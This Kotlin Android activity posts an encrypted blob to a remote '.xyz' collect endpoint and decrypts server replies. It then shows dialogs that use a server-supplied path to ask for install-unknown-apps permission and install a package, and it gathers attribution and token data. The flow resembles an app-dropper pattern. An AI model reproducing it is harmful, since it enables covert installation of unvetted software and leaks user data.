package net.basicmodel

import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.text.TextUtils
import android.util.Log
import android.webkit.JavascriptInterface
import android.widget.ProgressBar
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.StringCallback
import com.tencent.mmkv.MMKV
import com.xxxxxxh.http.RequestService
import com.xxxxxxh.update.ResponseListener
import com.xxxxxxh.update.UpdateManager
import net.entity.RequestBean
import net.entity.ResultEntity
import net.http.RetrofitUtils
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.ResponseBody
import retrofit2.Response

class MainActivity : AppCompatActivity(), ResponseListener {

    class WebInterface {
        @JavascriptInterface
        fun businessStart(a: String, b: String) {
            Log.i("xxxxxxH", "a = $a")
            Log.i("xxxxxxH", "b = $b")
        }
    }

    val retrofitUtils = RetrofitUtils().retrofit()
    val service = retrofitUtils.create(RequestService::class.java)
    var dialog1: AlertDialog? = null
    var dialog2: AlertDialog? = null
    var progressBar: ProgressBar? = null
    var manager: UpdateManager? = null
    var entity: ResultEntity? = null
    var dialog3: AlertDialog? = null

    @SuppressLint("SetJavaScriptEnabled")
    @RequiresApi(Build.VERSION_CODES.R)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val url = "https://kcoffni.xyz/api/open/collect?"
        val v =
            "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"
//        val params = RequestParams(url)
        val map = HashMap<String, String>()

        map["content"] = v
        /*Thunder.with(this)
            .assign(
                CallBuilder().url(url)
                    .buildPost()
            )
            .finish(object : Thunder.ResponseCallBack {
               override fun onResponse(response: ResponseData?) {

                }
            })
            .broken(object : Thunder.FailureCallBack {
                override fun onFailure(e: Exception?) {
                    // handle exception here
                }
            })
            .execute()*/
        val body: RequestBody = Gson().toJson(map)
            .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
        OkGo.post<String>(url).upRequestBody(body).execute(object : StringCallback() {
            override fun onSuccess(response: com.lzy.okgo.model.Response<String>?) {
                Log.i("xxxxxxH", response!!.body().toString())
            }

        })

        /* checkState()
         val requestBean = getRequestData()
         manager = UpdateManager.get()
         manager?.update(AesEncryptUtil.encrypt(Gson().toJson(requestBean)), this)
         val intentFilter = IntentFilter()
         intentFilter.addAction("action_download")
         intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED)
         intentFilter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE)
         registerReceiver(manager?.addReceiver(this), intentFilter)*/
    }

    private fun checkState() {
        if (MMKV.defaultMMKV()?.decodeBool("state") == false) {
            return
        }
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private fun getRequestData(): RequestBean {
        val istatus = MMKV.defaultMMKV()!!.decodeBool("isFirst", true)
        val requestBean = RequestBean()
        requestBean.appId = MyApplication().getAppId()
        requestBean.appName = MyApplication().getAppName()
        requestBean.applink = MMKV.defaultMMKV()!!.decodeString("facebook", "AppLink is empty")
        requestBean.ref = MMKV.defaultMMKV()!!.decodeString("google", "Referrer is empty")
        requestBean.token = MyApplication().getToken()
        requestBean.istatus = istatus
        return requestBean
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onResponse(response: Response<ResponseBody>) {
        val result = AesEncryptUtil.decrypt(response.body()!!.string())
        if (!TextUtils.isEmpty(result)) {
            val resultType = object : TypeToken<ResultEntity>() {}.type
            entity = Gson().fromJson<ResultEntity>(result, resultType)
            if (Build.VERSION.SDK_INT > 24) {
                dialog1 = manager?.permissionDlg(this, this, entity!!.ukey, entity!!.pkey)
                dialog1!!.show()
            } else {
                dialog3 = manager?.updateDlg(this, entity!!.ikey, entity!!.path)
                dialog3!!.show()
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (resultCode == Activity.RESULT_OK && requestCode == 1) {
            if (!this.packageManager.canRequestPackageInstalls()) {
                dialog1 = manager?.permissionDlg(this, this, entity!!.ukey, entity!!.pkey)
                dialog1!!.show()
            } else {
                dialog3 = manager?.updateDlg(this, entity!!.ikey, entity!!.path)
                dialog3!!.show()
            }

        }
    }

}